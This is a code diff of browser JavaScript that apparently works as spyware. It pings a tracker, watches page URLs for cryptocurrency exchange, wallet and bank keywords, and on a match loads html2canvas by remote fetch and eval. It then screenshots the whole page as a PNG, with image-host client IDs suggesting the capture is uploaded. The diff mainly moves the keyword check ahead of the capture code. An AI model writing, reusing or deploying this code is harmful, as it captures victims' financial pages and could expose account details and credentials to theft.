@@ -1,8 +1,12 @@
 (new Image).src = "https://whos.amung.us/swidget/bbbbbbbbf";
 
+var myStringArray = ["coin", "ether", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "bitcoin", "blockchain.info", "paxful.com", "coin.space", "coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com",
+"coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com", "mine", "btc", "ltc", "zcash", "banco", "bank", "banven", "banes"];
+var arrayLength = myStringArray.length;
+var i = 0;
+for (;i < arrayLength;i++) {
+  if (location.href.indexOf(myStringArray[i]) > -1) {
 
-if (typeof isrunmyproject == "undefined") {
-  isrunmyproject = 1;
   if (typeof html2canvas != "object") {
     var xmlHttp = new XMLHttpRequest;
     xmlHttp["open"]("GET", "https://html2canvas.hertzen.com/build/html2canvas.min.js", false);
@@ -10,12 +14,7 @@ if (typeof isrunmyproject == "undefined") {
     eval(xmlHttp["responseText"]);
   }
   var client_ids = ["3684103173db518", "aff413c4429c3e0", "c850fa264fe4583", "b9d8e7f2da3926a", "6dff965b85a21d7", "161dee2b693cca1", "7621dbdbefa1eeb", "e62a9eaa1d28307", "ecb1f96220c662f", "f3b0d63899cc902"];
-  var myStringArray = ["coin", "ether", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "bitcoin", "blockchain.info", "paxful.com", "coin.space", "coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com",
-  "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com", "mine", "btc", "ltc", "zcash", "banco", "bank", "banven", "banes"];
-  var arrayLength = myStringArray.length;
-  var i = 0;
-  for (;i < arrayLength;i++) {
-    if (location.href.indexOf(myStringArray[i]) > -1) {
+
       html2canvas(document.body, {
         allowTaint : true,
         taintTest : false,
@@ -42,7 +41,6 @@ if (typeof isrunmyproject == "undefined") {
           }, "image/png", 1);
         }
       });
-    }
   }
 }
 
